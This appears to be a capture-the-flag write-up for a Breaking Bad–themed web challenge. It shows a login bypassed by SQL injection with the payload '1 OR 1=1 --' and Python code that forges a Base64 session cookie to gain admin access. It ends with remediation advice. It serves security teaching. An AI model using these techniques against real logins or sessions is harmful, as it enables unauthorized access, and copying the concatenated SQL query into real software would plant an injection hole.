@@ -1,0 +1,182 @@
+<p>Hermanos</p>
+
+<p>Author: S.Pragyah</p>
+
+<p>This is a web exploitation CTF challenge based on the Los Pollos Hermanos universe from Breaking Bad. The objective is to gain administrative access to the Los Pollos Hermanos management console and retrieve the flag.</p>
+
+<p>The intended attack chain is:</p>
+
+<p>SQL Injection → Dashboard Access → Session Cookie Analysis → Base64 Decode → Role Manipulation → Admin Access → Flag</p>
+
+<p>Firstly, we access the login page.</p>
+
+<p>The application asks for an Employee ID and Password. A normal set of credentials available within the challenge is:</p>
+
+<p>Employee ID: 1<br />
+Password: heisenberg</p>
+
+<p>After analysing the application’s behaviour, we can identify that the Employee ID input is vulnerable to SQL Injection.</p>
+
+<p>The backend constructs its SQL query by directly concatenating user-controlled input:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td><td class="rouge-code"><pre><span class="n">query</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"""</span><span class="s">
+SELECT * FROM users
+WHERE id = </span><span class="si">{</span><span class="n">employee_id</span><span class="si">}</span><span class="s">
+AND password = </span><span class="sh">'</span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="sh">'</span><span class="s">
+</span><span class="sh">"""</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Since the Employee ID is inserted directly into the SQL query without parameterized statements, we can manipulate the query.</p>
+
+<p>We use the following payload:</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre>Employee ID: 1 OR 1=1 --
+Password: anything
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>The resulting SQL query becomes:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">users</span>
+<span class="k">WHERE</span> <span class="n">id</span> <span class="o">=</span> <span class="mi">1</span> <span class="k">OR</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span> <span class="c1">--</span>
+<span class="k">AND</span> <span class="n">password</span> <span class="o">=</span> <span class="s1">'anything'</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">--</code> sequence comments out the remaining password condition. Since <code class="language-plaintext highlighter-rouge">1=1</code> is always true, the application returns a valid user and allows us to access the dashboard.</p>
+
+<p>After successfully logging in, we are redirected to:</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>/dashboard
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Next, we inspect the browser’s <code class="language-plaintext highlighter-rouge">session</code> cookie.</p>
+
+<p>The cookie initially appears as an encoded string. However, after decoding it from Base64, we can see that it contains JSON data.</p>
+
+<p>We can decode the session cookie using Python:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">base64</span>
+
+<span class="n">cookie</span> <span class="o">=</span> <span class="sh">"</span><span class="s">PASTE_COOKIE_HERE</span><span class="sh">"</span>
+<span class="nf">print</span><span class="p">(</span><span class="n">base64</span><span class="p">.</span><span class="nf">b64decode</span><span class="p">(</span><span class="n">cookie</span><span class="p">).</span><span class="nf">decode</span><span class="p">())</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>The decoded session data has the following structure:</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="p">{</span><span class="nl">"user"</span><span class="p">:</span><span class="s2">"walter"</span><span class="p">,</span><span class="nl">"role"</span><span class="p">:</span><span class="s2">"employee"</span><span class="p">,</span><span class="nl">"session_version"</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span><span class="w">
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>This reveals the second vulnerability in the application.</p>
+
+<p>The user’s authorization role is stored entirely inside a client-controlled cookie. Furthermore, the cookie is only Base64 encoded. Base64 is an encoding mechanism and does not provide encryption or integrity protection.</p>
+
+<p>Therefore, we can modify the value of the <code class="language-plaintext highlighter-rouge">role</code> field from <code class="language-plaintext highlighter-rouge">employee</code> to <code class="language-plaintext highlighter-rouge">admin</code>.</p>
+
+<p>We create the following JSON object:</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="p">{</span><span class="nl">"user"</span><span class="p">:</span><span class="s2">"walter"</span><span class="p">,</span><span class="nl">"role"</span><span class="p">:</span><span class="s2">"admin"</span><span class="p">,</span><span class="nl">"session_version"</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span><span class="w">
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>We then encode it back into Base64 using:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre></td><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">base64</span>
+<span class="kn">import</span> <span class="n">json</span>
+
+<span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="sh">"</span><span class="s">user</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">walter</span><span class="sh">"</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">role</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">admin</span><span class="sh">"</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">session_version</span><span class="sh">"</span><span class="p">:</span> <span class="mi">1</span>
+<span class="p">}</span>
+
+<span class="nf">print</span><span class="p">(</span><span class="n">base64</span><span class="p">.</span><span class="nf">b64encode</span><span class="p">(</span><span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">(</span><span class="n">data</span><span class="p">).</span><span class="nf">encode</span><span class="p">()).</span><span class="nf">decode</span><span class="p">())</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>After generating the modified Base64 value, we replace the existing <code class="language-plaintext highlighter-rouge">session</code> cookie in the browser with our newly forged cookie.</p>
+
+<p>We can then visit the administrator endpoint:</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>/admin
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>The application checks the <code class="language-plaintext highlighter-rouge">role</code> value from the cookie:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre><span class="k">if</span> <span class="n">session_data</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">role</span><span class="sh">'</span><span class="p">)</span> <span class="o">!=</span> <span class="sh">'</span><span class="s">admin</span><span class="sh">'</span><span class="p">:</span>
+    <span class="k">return</span> <span class="sh">'</span><span class="s">&lt;h1&gt;403 Forbidden&lt;/h1&gt;&lt;p&gt;Administrative privileges required.&lt;/p&gt;</span><span class="sh">'</span><span class="p">,</span> <span class="mi">403</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Since our modified session now contains:</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>role: admin
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>the authorization check is bypassed and we gain access to the Los Pollos Hermanos administrator console.</p>
+
+<p>The flag is displayed on the admin page:</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>CYS{legacy_session_7f91c2e8}
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>The challenge contains two main vulnerabilities.</p>
+
+<p>SQL Injection:</p>
+
+<p>The application directly concatenates user-controlled input into an SQL query. This allows an attacker to alter the intended query logic and bypass authentication. In a real-world application, parameterized queries or prepared statements should always be used.</p>
+
+<p>Client-Controlled Authorization:</p>
+
+<p>The application stores the user’s authorization role inside a Base64-encoded cookie and trusts that value when checking access to the administrator page. Since Base64 provides no cryptographic protection, an attacker can decode, modify, and re-encode the session data. Authorization decisions should instead be maintained server-side or protected using a properly signed and verified session mechanism.</p>
+
+<p>The complete exploitation chain is therefore:</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre></td><td class="rouge-code"><pre>1. Access the Los Pollos Hermanos login page.
+2. Exploit SQL Injection using: 1 OR 1=1 --
+3. Gain access to the dashboard.
+4. Inspect and extract the session cookie.
+5. Base64-decode the cookie.
+6. Change role from employee to admin.
+7. Base64-encode the modified JSON data.
+8. Replace the original session cookie.
+9. Visit /admin.
+10. Retrieve the flag.
+</pre></td></tr></tbody></table></code></pre></div></div>
